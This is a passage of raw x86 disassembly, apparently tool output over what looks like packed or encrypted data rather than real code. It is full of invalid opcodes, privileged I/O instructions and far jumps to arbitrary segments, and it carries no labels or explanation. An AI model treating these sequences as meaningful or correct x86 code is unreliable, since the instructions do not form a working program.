  41a704:	cmp    al,0x73
  41a706:	out    dx,eax
  41a707:	cdq    
  41a708:	mov    al,0x55
  41a70a:	jle    0x41a72a
  41a70c:	adc    DWORD PTR [edi-0x131ab2b3],0xffffffd8
  41a713:	push   esi
  41a714:	imul   esp,esi,0x7e
  41a717:	inc    edx
  41a719:	loope  0x41a6d9
  41a71b:	pop    es
  41a71c:	jg     0x41a79d
  41a71e:	mov    esi,DWORD PTR [ecx+0x7b]
  41a721:	sahf   
  41a722:	xor    BYTE PTR ds:0xc6ac86a0,cl
  41a728:	aas    
  41a729:	ret    
  41a72a:	or     DWORD PTR gs:[eax-0x37],esi
  41a72e:	sahf   
  41a72f:	addr16 mov dh,0xf9
  41a732:	pop    edi
  41a733:	fild   WORD PTR [edi+0x180177fa]
  41a739:	(bad)  
  41a73a:	lock xor al,0x5b
  41a73d:	push   ebp
  41a73e:	push   ecx
  41a73f:	ret    
  41a740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a741:	jge    0x41a75a
  41a743:	push   0xffffffa1
  41a745:	das    
  41a746:	fidivr WORD PTR [esp+ebp*1-0x2eb56aae]
  41a74d:	xor    al,BYTE PTR [ecx-0x7a39bfbb]
  41a753:	int    0xc2
  41a755:	iret   
  41a756:	jp     0x41a6d9
  41a758:	inc    esi
  41a759:	(bad)  
  41a75a:	xchg   ebx,eax
  41a75b:	jge    0x41a767
  41a75d:	jne    0x41a763
  41a75f:	(bad)  
  41a760:	jle    0x41a7d3
  41a762:	(bad)  
  41a763:	lock xchg ecx,eax
  41a765:	adc    eax,DWORD PTR [edx+0x17]
  41a768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a769:	push   ebx
  41a76a:	or     DWORD PTR [ebx+edi*4],esp
  41a76d:	mov    ds:0x67ba009b,eax
  41a772:	or     BYTE PTR [ebp-0x66],bl
  41a775:	add    DWORD PTR [ebp-0x50],edx
  41a778:	gs aam 0x51
  41a77b:	push   edi
  41a77c:	jp     0x41a759
  41a77e:	jmp    0x62d75183
  41a783:	push   cs
  41a784:	test   ch,0x8a
  41a787:	inc    edx
  41a788:	jae    0x41a7b5
  41a78a:	add    al,0x51
  41a78c:	jnp    0x41a753
  41a78e:	js     0x41a80d
  41a790:	ss dec esp
  41a792:	cs fyl2xp1 
  41a795:	fs xor bl,0xb5
  41a799:	lds    esi,FWORD PTR [ecx-0x7d]
  41a79c:	daa    
  41a79d:	push   eax
  41a79e:	outs   dx,BYTE PTR ds:[esi]
  41a79f:	stos   BYTE PTR es:[edi],al
  41a7a0:	repz xor BYTE PTR [eax+0x786b074],cl
  41a7a7:	push   es
  41a7a8:	pusha  
  41a7a9:	icebp  
  41a7aa:	pop    edx
  41a7ab:	imul   DWORD PTR cs:[eax+0x53]
  41a7af:	and    al,0x95
  41a7b1:	mov    esp,0x1dbdf668
  41a7b6:	gs push ebp
  41a7b8:	xchg   edx,eax
  41a7b9:	ja     0x41a793
  41a7bb:	mov    dl,0x7c
  41a7bd:	xchg   DWORD PTR [ebx+0x71950d06],ebp
  41a7c3:	stc    
  41a7c4:	loop   0x41a772
  41a7c6:	cwd    
  41a7c8:	mov    ds:0xd584611a,eax
  41a7cd:	in     eax,dx
  41a7ce:	sub    eax,0xf2450728
  41a7d3:	cmp    eax,0x6b159d31
  41a7d8:	sbb    BYTE PTR [ebx],al
  41a7da:	add    BYTE PTR [edx],0x6c
  41a7dd:	call   0x4e23e7bf
  41a7e2:	dec    esi
  41a7e3:	mov    ss,WORD PTR [ebx-0xb]
  41a7e6:	jbe    0x41a81c
  41a7e8:	loop   0x41a7a3
  41a7ea:	in     al,dx
  41a7eb:	pop    ss
  41a7ec:	sub    DWORD PTR [ecx+ebx*8],ebx
  41a7ef:	retf   0x2614
  41a7f2:	adc    dh,BYTE PTR ds:[ecx]
  41a7f5:	jbe    0x41a866
  41a7f7:	aad    0xb0
  41a7f9:	xchg   ebx,eax
  41a7fa:	in     al,dx
  41a7fb:	cmp    eax,0x3482eb9a
  41a800:	fldenv [ecx+0xa455206]
  41a806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a807:	sub    DWORD PTR [ebx+0x559da225],esi
  41a80d:	int3   
  41a80e:	jne    0x41a7c2
  41a810:	adc    al,0xa
  41a812:	enter  0x2c25,0xd9
  41a816:	fadd   QWORD PTR [ebx-0x48]
  41a819:	inc    esi
  41a81a:	mov    esi,0x6ecfd102
  41a81f:	cld    
  41a820:	fcom   QWORD PTR [edx+0x5a]
  41a823:	inc    edi
  41a824:	(bad)  
  41a825:	fnsave [ebx]
  41a827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a828:	mov    ah,0xfa
  41a82a:	inc    eax
  41a82b:	or     eax,0x798a3360
  41a830:	lods   al,BYTE PTR ds:[esi]
  41a831:	adc    al,0x73
  41a833:	or     bl,dh
  41a835:	dec    ebp
  41a836:	lods   al,BYTE PTR ds:[esi]
  41a837:	xlat   BYTE PTR ds:[ebx]
  41a838:	xor    al,0xf3
  41a83a:	xor    al,0xd3
  41a83c:	mov    BYTE PTR ds:0x5f9e6ddb,dh
  41a842:	lds    eax,FWORD PTR [edi+eiz*4+0x78971df]
  41a849:	fwait
  41a84a:	lds    eax,FWORD PTR [ecx-0x2e4a73c4]
  41a850:	xlat   BYTE PTR ds:[ebx]
  41a851:	fbstp  TBYTE PTR [esi-0x6b]
  41a854:	pop    ss
  41a855:	int3   
  41a856:	xor    al,0x80
  41a858:	pop    eax
  41a859:	push   ds
  41a85a:	mov    al,BYTE PTR [edi]
  41a85c:	outs   dx,DWORD PTR ds:[esi]
  41a85d:	dec    ebx
  41a85e:	jl     0x41a8c5
  41a860:	mov    dh,0x55
  41a862:	mov    al,0x1b
  41a864:	jae    0x41a8b4
  41a866:	out    0x1d,al
  41a868:	outs   dx,DWORD PTR ds:[esi]
  41a869:	outs   dx,DWORD PTR ds:[esi]
  41a86a:	inc    edx
  41a86b:	mov    dl,0x20
  41a86d:	fs sti 
  41a86f:	cld    
  41a870:	mov    cl,0xfa
  41a872:	mov    al,ds:0x96ad5aba
  41a877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a878:	inc    ebp
  41a879:	add    dh,BYTE PTR [ebx-0x20a13620]
  41a87f:	cmp    bl,BYTE PTR [eax+0x49]
  41a882:	cmp    ecx,DWORD PTR [ebx-0x7e0a1694]
  41a888:	popf   
  41a889:	imul   ecx,ecx,0x7af2572a
  41a88f:	mov    ch,BYTE PTR [edx+0xa]
  41a892:	jl     0x41a8db
  41a894:	inc    ecx
  41a895:	test   DWORD PTR [ecx],eax
  41a897:	push   edx
  41a898:	mov    ah,0xf6
  41a89a:	jno    0x41a8e9
  41a89c:	mov    ecx,0x18c99f81
  41a8a1:	das    
  41a8a2:	gs mov esi,0x985e86d6
  41a8a8:	loope  0x41a835
  41a8aa:	in     al,0xba
  41a8ac:	jmp    0x41a89b
  41a8ae:	mov    ds:0x31eec435,eax
  41a8b3:	sti    
  41a8b4:	push   ebx
  41a8b5:	fnstsw WORD PTR [esp+ebp*8]
  41a8b8:	jnp    0x41a8a4
  41a8ba:	shl    DWORD PTR [edi],cl
  41a8bc:	and    eax,0xdf6e9bff
  41a8c1:	push   eax
  41a8c2:	jns    0x41a8b5
  41a8c4:	sub    ah,BYTE PTR [esi]
  41a8c6:	and    ch,BYTE PTR [eax+0xe]
  41a8c9:	xchg   ebx,eax
  41a8ca:	imul   eax,eax,0x1d3742a9
  41a8d0:	mov    bl,0x73
  41a8d2:	fistp  WORD PTR [edx-0x6e58489f]
  41a8d8:	addr16 cmp al,0x11
  41a8db:	and    esp,DWORD PTR [esi-0x4a]
  41a8de:	push   ebx
  41a8df:	xchg   ebp,eax
  41a8e0:	call   0x8c14:0x6e75c759
  41a8e7:	mov    edi,DWORD PTR [edi+0x66]
  41a8ea:	ds mov ah,0x60
  41a8ed:	pop    ecx
  41a8ee:	ds or  al,0x8e
  41a8f1:	leave  
  41a8f2:	data16 mov BYTE PTR ds:0xc6abcfcb,dl
  41a8f9:	ret    0x5b1f
  41a8fc:	mov    BYTE PTR [ebx-0x5c],0x32
  41a900:	shl    BYTE PTR [ebp-0x67f6246a],1
  41a906:	dec    ecx
  41a907:	hlt    
  41a908:	or     eax,0xb3a3f760
  41a90d:	xchg   DWORD PTR [esi-0x63253d34],eax
  41a913:	adc    DWORD PTR [esi],edi
  41a915:	push   ebp
  41a916:	adc    al,0x16
  41a918:	shl    BYTE PTR [ecx-0x53286924],1
  41a91e:	lea    eax,[ebp+0x72]
  41a921:	(bad)
  41a924:	jl     0x41a900
  41a926:	mov    dh,BYTE PTR [eax]
  41a928:	mov    dh,0xad
  41a92a:	dec    esp
  41a92b:	adc    al,0x8c
  41a92d:	mov    bh,0xbf
  41a92f:	push   esi
  41a930:	mov    ah,al
  41a932:	loopne 0x41a926
  41a934:	jmp    0x41a996
  41a936:	and    cl,BYTE PTR [ebp-0x30b68bad]
  41a93c:	repz cs aaa 
  41a93f:	xchg   edi,eax
  41a940:	dec    eax
  41a941:	aaa    
  41a942:	pop    edi
  41a943:	outs   dx,DWORD PTR ds:[esi]
  41a944:	mov    dh,0x18
  41a946:	and    BYTE PTR [esi-0x3a],bh
  41a949:	add    al,0xab
  41a94b:	or     dh,dh
  41a94d:	lock or al,0x1
  41a950:	shl    DWORD PTR [ebp-0x33157e99],1
  41a956:	adc    eax,0x93b877e6
  41a95b:	sub    BYTE PTR [ecx],bh
  41a95d:	dec    eax
  41a95e:	adc    BYTE PTR [edx-0x5f178303],0x4f
  41a965:	add    ebx,DWORD PTR [edi]
  41a967:	sar    BYTE PTR [edx+0x3e9a16cf],1
  41a96d:	fcom   DWORD PTR [ebx-0x14]
  41a970:	stos   DWORD PTR es:[edi],eax
  41a971:	mov    bh,0xa1
  41a973:	fisub  DWORD PTR ds:0x505f2e1e
  41a979:	loop   0x41a987
  41a97b:	jge    0x41a9c4
  41a97d:	leave  
  41a97e:	lods   eax,DWORD PTR ds:[esi]
  41a97f:	test   BYTE PTR [esi-0x29],cl
  41a982:	popf   
  41a983:	fidivr DWORD PTR [edx]
  41a985:	cmp    al,0xb0
  41a987:	retf   
  41a988:	or     BYTE PTR [esi+0x19],bh
  41a98b:	or     bh,bl
  41a98d:	out    0xfe,al
  41a98f:	mov    ecx,0x14196e7d
  41a994:	in     al,0xf3
  41a996:	push   edx
  41a997:	xor    ah,BYTE PTR [ebx]
  41a999:	pusha  
  41a99a:	repz and al,0xd4
  41a99d:	fimul  WORD PTR [esi]
  41a99f:	and    al,0xe0
  41a9a1:	repz pop ds
  41a9a3:	sar    BYTE PTR [esi],0x47
  41a9a6:	mov    dl,BYTE PTR [esi+eax*8-0x1807db4f]
  41a9ad:	(bad)  
  41a9ae:	pop    edi
  41a9af:	xchg   ecx,eax
  41a9b0:	jae    0x41a9d8
  41a9b2:	mov    bh,BYTE PTR [ebp+0x1c]
  41a9b5:	jo     0x41a97d
  41a9b7:	push   0x72
  41a9b9:	xchg   ebp,eax
  41a9ba:	mov    edi,0x2d99e4e2
  41a9bf:	adc    ebp,ecx
  41a9c1:	jb     0x41a949
  41a9c3:	lock jecxz 0x41a977
  41a9c6:	sub    ch,bh
  41a9c8:	mov    ds:0xc47fc23a,eax
  41a9cd:	xor    BYTE PTR [edi],ah
  41a9cf:	pop    eax
  41a9d0:	aaa    
  41a9d1:	dec    edx
  41a9d2:	mov    edx,0x380607
  41a9d7:	mov    ah,0x5b
  41a9d9:	mov    WORD PTR [bp+si+0x37],es
  41a9dd:	sub    eax,DWORD PTR [esi+0x3b]
  41a9e0:	icebp  
  41a9e1:	fdivr  DWORD PTR [eax+0x4a]
  41a9e4:	aaa    
  41a9e5:	icebp  
  41a9e6:	mov    bh,0xc6
  41a9e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9e9:	adc    eax,0xc7fc01b1
  41a9ee:	xor    bh,BYTE PTR [ebp+0x60f85414]
  41a9f4:	call   0x9823:0x6408ae54
  41a9fb:	dec    edi
  41a9fc:	aad    0x26
  41a9fe:	(bad)  
  41a9ff:	enter  0x5be2,0xc2
  41aa03:	pop    es
  41aa04:	xor    eax,0x8e8b71fc
  41aa09:	retf   0xc3a9
  41aa0c:	or     ah,BYTE PTR [ebp-0x6f]
  41aa0f:	or     BYTE PTR ds:0x3d066fe6,cl
  41aa15:	aas    
  41aa16:	sub    eax,0x92113fec
  41aa1b:	imul   esp,ecx,0xcde4ad5c
  41aa21:	outs   dx,BYTE PTR ds:[esi]
  41aa22:	pop    esi
  41aa23:	dec    ebp
  41aa24:	icebp  
  41aa25:	add    al,0x19
  41aa27:	(bad)  
  41aa28:	fild   WORD PTR [eax+0x745f584e]
  41aa2e:	xchg   esp,eax
  41aa2f:	adc    eax,0xf24106a5
  41aa34:	push   0x74
  41aa36:	fwait
  41aa37:	pop    ebx
  41aa38:	sub    DWORD PTR [ecx+ecx*2+0x18],ecx
  41aa3c:	add    BYTE PTR [ecx],0xdc
  41aa3f:	jmp    0xe166:0x5197a4fa
  41aa46:	aad    0x33
  41aa48:	aaa    
  41aa49:	and    DWORD PTR [ecx-0x15ad620f],ebp
  41aa4f:	or     ch,ah
  41aa51:	push   eax
  41aa52:	xchg   edi,eax
  41aa53:	out    dx,al
  41aa54:	and    eax,0xf393e471
  41aa59:	cli    
  41aa5a:	xchg   ecx,eax
  41aa5b:	sub    dh,dh
  41aa5d:	icebp  
  41aa5e:	hlt    
  41aa5f:	push   es
  41aa60:	jne    0x41aa2f
  41aa62:	repnz stos DWORD PTR es:[edi],eax
  41aa64:	add    dl,BYTE PTR [ecx+0x59b4b0a6]
  41aa6a:	push   ds
  41aa6b:	imul   ebx,DWORD PTR [eax],0x75758bc6
  41aa71:	inc    ebx
  41aa72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa73:	mov    ds:0x468a5f72,eax
  41aa78:	fsubr  QWORD PTR cs:[esp+edx*2-0x3]
  41aa7d:	dec    ebp
  41aa7e:	ss call 0xaac04360
  41aa84:	scas   al,BYTE PTR es:[edi]
  41aa85:	and    cl,dl
  41aa87:	pop    edi
  41aa88:	fld    QWORD PTR [ebx-0x7f]
  41aa8b:	add    al,0x92
  41aa8d:	fistp  QWORD PTR [edx]
  41aa8f:	xchg   edi,eax
  41aa90:	adc    al,BYTE PTR [esi+ecx*8]
  41aa93:	push   cs
  41aa94:	pusha  
  41aa95:	sbb    DWORD PTR [edi],ebp
  41aa97:	mov    eax,esp
  41aa99:	mov    al,0xad
  41aa9b:	pop    ss
  41aa9c:	sbb    al,0x62
  41aa9e:	call   0xe559:0x15269b2
  41aaa5:	lods   eax,DWORD PTR ds:[esi]
  41aaa6:	pop    ebp
  41aaa7:	dec    ebx
  41aaa8:	iret   
  41aaa9:	jb     0x41aa6d
  41aaab:	lock mov cl,0x92
  41aaae:	jge    0x41aad5
  41aab0:	gs in  al,dx
  41aab2:	mov    al,ds:0x252ca6b7
  41aab7:	stc    
  41aab8:	cdq    
  41aab9:	daa    
  41aaba:	xchg   edx,eax
  41aabb:	and    al,0xf3
  41aabd:	enter  0xbf9d,0x25
  41aac1:	cmp    eax,0x70e8e4c5
  41aac6:	out    0xc3,al
  41aac8:	mov    ds:0xace41c0c,eax
  41aacd:	and    ch,BYTE PTR [eax+0x4285afe]
  41aad3:	lds    esp,FWORD PTR [ecx]
  41aad5:	pushf  
  41aad6:	dec    edx
  41aad7:	jge    0x41aa99
  41aad9:	and    esp,DWORD PTR [eax+0x49059ace]
  41aadf:	stos   DWORD PTR es:[edi],eax
  41aae0:	in     eax,0x26
  41aae2:	sub    eax,0x7c52515f
  41aae7:	sub    DWORD PTR [eax+0x40],esp
  41aaea:	popa   
  41aaeb:	sub    BYTE PTR [eax+0x34e054db],ch
  41aaf1:	pop    esp
  41aaf2:	jmp    0xbd91:0x2267af7f
  41aaf9:	clc    
  41aafa:	loope  0x41ab26
  41aafc:	lock lods eax,DWORD PTR ds:[esi]
  41aafe:	sub    al,BYTE PTR [eax-0x1d04c179]
  41ab04:	push   ebp
  41ab05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab06:	loopne 0x41aac2
  41ab08:	scas   al,BYTE PTR es:[edi]
  41ab09:	push   es
  41ab0a:	mov    DWORD PTR [eax-0x22],esp
  41ab0d:	push   0x6bbe88d7
  41ab12:	imul   ebp,DWORD PTR [esi+0x69e146ed],0x73
  41ab19:	mov    ah,0x72
  41ab1b:	imul   DWORD PTR [edx+0x538b6733]
  41ab21:	lods   eax,DWORD PTR ds:[esi]
  41ab22:	jbe    0x41aaca
  41ab24:	mov    BYTE PTR [edx-0x2b],bl
  41ab27:	test   eax,0x3e11c1ce
  41ab2c:	retf   0x8f3c
  41ab2f:	push   eax
  41ab30:	popa   
  41ab31:	jne    0x41ab3a
  41ab33:	gs test eax,0x6cf15b69
  41ab39:	cmp    cl,BYTE PTR [esi-0x92cbe62]
  41ab3f:	out    dx,al
  41ab40:	mov    dl,ah
  41ab42:	repz cwde 
  41ab44:	add    cl,BYTE PTR [eax+0x4e]
  41ab47:	dec    eax
  41ab48:	jmp    0x80525533
  41ab4d:	(bad)  
  41ab4e:	es scas eax,DWORD PTR es:[edi]
  41ab50:	and    al,0x26
  41ab52:	stc    
  41ab53:	mov    ah,0xb1
  41ab55:	test   al,0x96
  41ab57:	mov    DWORD PTR [ecx+eiz*2],esi
  41ab5a:	xor    al,0x48
  41ab5c:	mov    al,ds:0x7bc8a235
  41ab61:	or     edx,DWORD PTR [edi+edx*8]
  41ab64:	lods   al,BYTE PTR ds:[esi]
  41ab65:	ret    
  41ab66:	jns    0x41ab32
  41ab68:	inc    edx
  41ab69:	dec    ecx
  41ab6a:	call   0x27f0:0x931b6372
  41ab71:	outs   dx,DWORD PTR ds:[esi]
  41ab72:	aam    0x74
  41ab74:	and    DWORD PTR [ebp+0x3e],esi
  41ab77:	or     DWORD PTR [ebx],ebp
  41ab79:	lods   eax,DWORD PTR ds:[esi]
  41ab7a:	scas   eax,DWORD PTR es:[edi]
  41ab7b:	push   edx
  41ab7c:	lods   al,BYTE PTR ds:[esi]
  41ab7d:	in     eax,0xfc
  41ab7f:	outs   dx,DWORD PTR ds:[esi]
  41ab80:	and    BYTE PTR [ebx],ah
  41ab82:	mov    BYTE PTR [ecx],dh
  41ab84:	sub    al,0x65
  41ab86:	jns    0x41ac05
  41ab88:	xor    ah,0x20
  41ab8b:	jnp    0x41ab9c
  41ab8d:	lods   al,BYTE PTR ds:[esi]
  41ab8e:	dec    ebx
  41ab8f:	aas    
  41ab90:	ret    
  41ab91:	or     al,0x50
  41ab93:	retf   0x420f
  41ab96:	retf   
  41ab97:	jp     0x41ab88
  41ab99:	dec    edi
  41ab9a:	test   al,0x1b
  41ab9c:	xchg   edi,eax
  41ab9d:	test   cl,0x79
  41aba0:	cmp    esp,0xffffffe9
  41aba3:	test   DWORD PTR [ebx-0x5f],esp
  41aba6:	outs   dx,DWORD PTR cs:[esi]
  41aba8:	ins    BYTE PTR es:[edi],dx
  41aba9:	mov    ebp,0xbf97373e
  41abae:	rcr    BYTE PTR [ebx],0x6d
  41abb1:	sub    al,0xc0
  41abb3:	mov    bh,BYTE PTR [esi-0x4]
  41abb6:	iret   
  41abb7:	mov    esp,0x3e517c5f
  41abbc:	(bad)  
  41abbd:	nop
  41abbe:	je     0x41ab56
  41abc0:	call   0x83aa:0xa315665a
  41abc7:	dec    edx
  41abc8:	enter  0xff4d,0x29
  41abcc:	fptan  
  41abce:	into   
  41abcf:	jo     0x41abb3
  41abd1:	outs   dx,BYTE PTR ds:[esi]
  41abd2:	and    al,0x42
  41abd4:	stos   BYTE PTR es:[edi],al
  41abd5:	dec    ebx
  41abd6:	loope  0x41ac0e
  41abd8:	neg    DWORD PTR [ebp-0x63]
  41abdb:	mov    cs,WORD PTR [edi+0x37]
  41abde:	xchg   DWORD PTR [ebx+0x7e9313b4],edi
  41abe4:	iret   
  41abe5:	ret    
  41abe6:	jnp    0x41abba
  41abe8:	pop    ss
  41abe9:	aaa    
  41abea:	rcr    edi,cl
  41abec:	pop    ecx
  41abed:	mov    dh,0x94
  41abef:	jp     0x41abd5
  41abf1:	stc    
  41abf2:	cmc    
  41abf3:	arpl   WORD PTR [ecx],cx
  41abf5:	cmp    eax,0x4024ab6f
  41abfa:	mov    esi,0x504932a
  41abff:	xlat   BYTE PTR ds:[ebx]
  41ac00:	pop    ecx
  41ac01:	push   ecx
  41ac02:	inc    edi
  41ac03:	lea    esi,[ebx]
  41ac05:	sub    al,0xca
  41ac07:	xor    eax,0xd965c1d
  41ac0c:	repz ja 0x41ac86
  41ac0f:	xor    esi,edx
  41ac11:	sub    edi,DWORD PTR [ebp+0x1d]
  41ac14:	out    0xe4,al
  41ac16:	cwde   
  41ac17:	fadd   QWORD PTR [ebx-0x46c8123]
  41ac1d:	shr    BYTE PTR [esi+0x31893668],0x5f
  41ac24:	stos   BYTE PTR es:[edi],al
  41ac25:	retf   
  41ac26:	ror    bl,1
  41ac28:	dec    ebp
  41ac29:	mov    edi,0xcdbdb07c
  41ac2e:	xchg   ebx,eax
  41ac2f:	dec    edi
  41ac30:	pop    esi
  41ac31:	stos   DWORD PTR es:[edi],eax
  41ac32:	add    ebx,DWORD PTR ds:0xeba5b8a1
  41ac38:	lds    edx,FWORD PTR [eax]
  41ac3a:	inc    ecx
  41ac3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac3c:	jp     0x41ac3a
  41ac3e:	or     DWORD PTR [ebx+0xa],esp
  41ac41:	pop    ds
  41ac42:	mov    esi,0xd543404b
  41ac47:	mov    esi,0xe9e3ad7
  41ac4c:	int3   
  41ac4d:	das    
  41ac4e:	mov    dh,0x88
  41ac50:	and    al,0x50
  41ac52:	xchg   ecx,eax
  41ac53:	inc    eax
  41ac54:	retf   
  41ac55:	push   ebx
  41ac56:	scas   al,BYTE PTR es:[edi]
  41ac57:	cmp    ecx,DWORD PTR [ebx+0x7760ce42]
  41ac5d:	aas    
  41ac5e:	lahf   
  41ac5f:	mov    al,ds:0x5265fd3d
  41ac64:	xor    ebx,ebp
  41ac66:	pop    es
  41ac67:	loope  0x41ac7c
  41ac69:	cmp    DWORD PTR [ebp-0x53],edx
  41ac6c:	or     cl,bh
  41ac6e:	jp     0x41ac21
  41ac70:	retf   
  41ac71:	or     al,0x33
  41ac73:	in     al,dx
  41ac74:	mov    al,ds:0x77118ab4
  41ac79:	jo     0x41acd1
  41ac7b:	or     cl,BYTE PTR [eax-0x60]
  41ac7e:	xchg   bh,dl
  41ac80:	ret    
  41ac81:	push   ebp
  41ac82:	jmp    0xc7e:0xaa357dce
  41ac89:	dec    edx
  41ac8a:	pop    ss
  41ac8b:	add    BYTE PTR [eax-0x1c7394a1],0xd8
  41ac92:	xchg   ebx,esp
  41ac94:	repnz dec edx
  41ac96:	pushf  
  41ac97:	mov    edx,DWORD PTR [ecx-0x77]
  41ac9a:	dec    ebx
  41ac9b:	push   es
  41ac9c:	ins    BYTE PTR es:[edi],dx
  41ac9d:	xor    ebp,DWORD PTR [edx+0x25e10c14]
  41aca3:	pop    ebx
  41aca4:	mov    ebp,0xd7879d75
  41aca9:	sahf   
  41acaa:	je     0x41acd2
  41acac:	pop    ds
  41acad:	xor    al,0xfb
  41acaf:	repz (bad) 
  41acb1:	mov    cl,0xe6
  41acb3:	inc    esp
  41acb4:	dec    edx
  41acb5:	iret   
  41acb6:	cdq    
  41acb7:	jmp    0x2ef6:0xfe4ccfa3
  41acbe:	push   edi
  41acbf:	ins    DWORD PTR es:[edi],dx
  41acc0:	ins    BYTE PTR es:[edi],dx
  41acc1:	ss das 
  41acc3:	(bad)  
  41acc4:	pop    eax
  41acc5:	push   ecx
  41acc6:	dec    ebp
  41acc7:	daa    
  41acc8:	das    
  41acc9:	pop    edx
  41acca:	stos   BYTE PTR es:[edi],al
  41accb:	imul   DWORD PTR [ebx+edi*2]
  41acce:	and    al,0x23
  41acd0:	inc    esi
  41acd1:	add    al,0xae
  41acd3:	int3   
  41acd4:	push   ss
  41acd5:	adc    al,BYTE PTR [esi+edi*1-0x1d]
  41acd9:	sbb    bh,BYTE PTR [edi-0xe]
  41acdc:	or     eax,0x3d1265df
  41ace1:	int3   
  41ace2:	mov    WORD PTR [edi+0x7a],gs
  41ace5:	enter  0xf5c0,0x29
  41ace9:	or     edi,DWORD PTR [esi+edx*4]
  41acec:	cmp    ah,BYTE PTR [eax]
  41acee:	mov    cl,0x91
  41acf0:	aaa    
  41acf1:	pop    ds
  41acf2:	loopne 0x41acfe
  41acf4:	out    dx,al
  41acf5:	xchg   ebp,eax
  41acf6:	es xor ch,dl
  41acf9:	je     0x41ad6c
  41acfb:	mov    dl,0x94
  41acfd:	gs out dx,al
  41acff:	sub    BYTE PTR [eax-0x50],ah
  41ad02:	cmp    BYTE PTR [esi-0x1a887b43],0x1
  41ad09:	test   BYTE PTR [eax+esi*8-0x6],al
  41ad0d:	test   bh,0x93
  41ad10:	push   ecx
  41ad11:	jmp    0xc26ba825
  41ad16:	(bad)  
  41ad17:	stos   DWORD PTR es:[edi],eax
  41ad18:	mov    cl,0x11
  41ad1a:	in     al,dx
  41ad1b:	push   edi
  41ad1c:	retf   
  41ad1d:	scas   eax,DWORD PTR es:[edi]
  41ad1e:	mov    bh,bh
  41ad20:	fcomp  QWORD PTR fs:[eax-0x9]
  41ad24:	(bad)  
  41ad26:	icebp  
  41ad27:	push   ebp
  41ad28:	jmp    0x41acae
  41ad2a:	jbe    0x41ad2a
  41ad2c:	lds    ebx,FWORD PTR [ebx]
  41ad2e:	sub    DWORD PTR [edi-0x29ba9024],edi
  41ad34:	pop    es
  41ad35:	hlt    
  41ad36:	and    al,0xb0
  41ad38:	inc    eax
  41ad39:	sbb    eax,0xe1686c2c
  41ad3e:	mov    esi,0x48cd002
  41ad43:	inc    edi
  41ad44:	call   0xc6cc8a59
  41ad49:	pop    ecx
  41ad4a:	sbb    BYTE PTR [eax-0x57],ah
  41ad4d:	add    eax,0x8f4385fe
  41ad52:	add    DWORD PTR [edx],0x5d
  41ad55:	les    eax,FWORD PTR [esi+edx*1+0x4f90b94e]
  41ad5c:	jnp    0x41adcd
  41ad5e:	ins    DWORD PTR es:[edi],dx
  41ad5f:	push   es
  41ad60:	shr    cl,0x21
  41ad63:	mov    esi,0x72ca20e
  41ad68:	in     eax,0x84
  41ad6a:	clc    
  41ad6b:	jnp    0x41ad29
  41ad6d:	inc    ecx
  41ad6e:	out    0xdf,eax
  41ad70:	je     0x41adb7
  41ad72:	jmp    0x41add7
  41ad74:	int3   
  41ad75:	imul   bh
  41ad77:	(bad)  
  41ad78:	in     al,0xe3
  41ad7a:	fisubr DWORD PTR [edx+0x12]
  41ad7d:	shr    DWORD PTR [esi],1
  41ad7f:	rcl    BYTE PTR [ebx+0x70661a4f],1
  41ad85:	pop    eax
  41ad86:	jmp    0x4c63d9e1
  41ad8b:	pop    esp
  41ad8c:	sub    bl,BYTE PTR [ebp-0x172ed7cb]
  41ad92:	dec    ebp
  41ad93:	or     BYTE PTR [edi],bl
  41ad95:	sbb    BYTE PTR [ebx+0x6402133a],0xcd
  41ad9c:	jmp    0xf0f9:0xdbc1ffe0
  41ada3:	out    dx,eax
  41ada4:	(bad)  
  41ada5:	jno    0x41ad60
  41ada7:	fimul  DWORD PTR [ebp-0x2166ef16]
  41adad:	mov    ss,WORD PTR [edi+0x169219ea]
  41adb3:	push   ebx
  41adb4:	or     edi,edi
  41adb6:	stos   DWORD PTR es:[edi],eax
  41adb7:	mov    WORD PTR [esi],fs
  41adb9:	hlt    
  41adba:	out    dx,eax
  41adbb:	mov    esi,0xa55ee32
  41adc0:	(bad)  
  41adc1:	cmc    
  41adc2:	stos   DWORD PTR es:[edi],eax
  41adc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adc4:	lea    edx,[esi]
  41adc6:	cmc    
  41adc7:	aam    0xb8
  41adc9:	mov    al,0x83
  41adcb:	mov    edi,0xf27c2194
  41add0:	inc    DWORD PTR [edi-0x1e]
  41add3:	std    
  41add4:	jmp    0x24a8127e
  41add9:	shl    dh,0x26
  41addc:	and    ah,BYTE PTR [eax]
  41adde:	ins    BYTE PTR es:[edi],dx
  41addf:	stos   DWORD PTR es:[edi],eax
  41ade0:	adc    BYTE PTR [ebx+eax*2],al
  41ade3:	jle    0x41ae0b
  41ade5:	push   ds
  41ade6:	sbb    al,0x15
  41ade8:	jmp    0x212b1be4
  41aded:	mov    ah,0xe7
  41adef:	mov    ebx,DWORD PTR [edi]
  41adf1:	data16 fdivr QWORD PTR [ecx]
  41adf4:	dec    ebx
  41adf5:	int    0xcd
  41adf7:	lock shr DWORD PTR [ecx],1
  41adfa:	popa   
  41adfb:	push   0x1d
  41adfd:	push   edi
  41adfe:	inc    ebp
  41adff:	inc    eax
  41ae00:	mov    esp,0xc75b88ae
  41ae05:	mov    al,0xa
  41ae07:	aaa    
  41ae08:	inc    edi
  41ae09:	outs   dx,BYTE PTR ds:[esi]
  41ae0a:	jp     0x41ae3e
  41ae0c:	pop    es
  41ae0d:	xlat   BYTE PTR ds:[ebx]
  41ae0e:	ret    0x5170
  41ae11:	(bad)  
  41ae12:	rcr    DWORD PTR [edx+edx*2+0x46],cl
  41ae16:	jl     0x41adbe
  41ae18:	in     al,dx
  41ae19:	in     eax,dx
  41ae1a:	shl    BYTE PTR [ebx+0x45],1
  41ae1d:	ret    0x2865
  41ae20:	jmp    0x41ae1a
  41ae22:	push   ds
  41ae23:	adc    ch,cl
  41ae25:	sub    DWORD PTR [eax+0x45],ebp
  41ae28:	lods   eax,DWORD PTR ds:[esi]
